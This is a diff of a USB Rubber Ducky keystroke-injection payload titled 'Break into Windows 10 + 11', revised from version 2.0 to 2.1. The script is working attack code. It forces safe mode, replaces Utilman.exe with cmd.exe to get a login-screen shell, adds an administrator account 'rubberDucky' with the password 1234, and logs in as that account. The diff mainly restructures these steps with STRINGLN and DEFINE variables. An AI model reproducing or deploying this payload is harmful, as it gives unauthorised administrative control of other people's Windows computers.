@@ -3,8 +3,14 @@ REM Author: Tzur Soffer
 REM Description: Break into Windows 10 + 11
 REM Target: Windows 10, Windows 10
 REM Props: Hak5, Darren Kitchen, Korben
-REM Version: 2.0
+REM Version: 2.1
 REM Category: General
+
+DEFINE #ACCOUNT_PASSWORD 1234
+DEFINE #ACCOUNT_NAME rubberDucky
+
+REM wait for Windows to accept keystrokes
+EXTENSION PASSIVE_WINDOWS_DETECT
 
 REM get into safe mode
 STRING QQQQQQQQQ
@@ -48,29 +54,18 @@ DELAY 1000
 REM replace utilman.exe with cmd.exe
 
 REM Check each drive from C: to G: for Utilman.exe
-STRING @echo off
-ENTER
-STRING setlocal enabledelayedexpansion
-ENTER
-STRING for %d in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
-ENTER
-STRING     if exist %d:\Windows\System32\Utilman.exe (
-ENTER
-STRING         echo Utilman.exe found in drive %d:
-ENTER
-STRING         cd /d %d:\Windows\System32\
-ENTER
-STRING     )
-ENTER
-STRING )
-ENTER
-STRING copy Utilman.exe  Utilman2.exe
-ENTER
-STRING copy  cmd.exe  Utilman.exe /y
-ENTER
+STRINGLN @echo off
+STRINGLN setlocal enabledelayedexpansion
+STRINGLN for %d in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
+STRINGLN     if exist %d:\Windows\System32\Utilman.exe (
+STRINGLN         echo Utilman.exe found in drive %d:
+STRINGLN         cd /d %d:\Windows\System32\
+STRINGLN     )
+STRINGLN )
+STRINGLN copy Utilman.exe  Utilman2.exe
+STRINGLN copy  cmd.exe  Utilman.exe /y
 
-STRING exit
-ENTER
+STRINGLN exit
 DELAY 1000
 ENTER
 DELAY 60000
@@ -87,12 +82,9 @@ ENTER
 DELAY 1000
 
 REM create new admin acount
-STRING net user rubberDucky 1234 /add
-ENTER
-STRING net localgroup administrators rubberDucky /add
-ENTER
-STRING shutdown /l
-ENTER
+STRINGLN net user #ACCOUNT_NAME #ACCOUNT_PASSWORD /add
+STRINGLN net localgroup administrators #ACCOUNT_NAME /add
+STRINGLN shutdown /l
 DELAY 10000
 
 REM login to new user
@@ -110,5 +102,4 @@ DELAY 50
 RELEASE SHIFT
 ENTER
 DELAY 500
-STRING 1234
-ENTER
+STRINGLN #ACCOUNT_PASSWORD
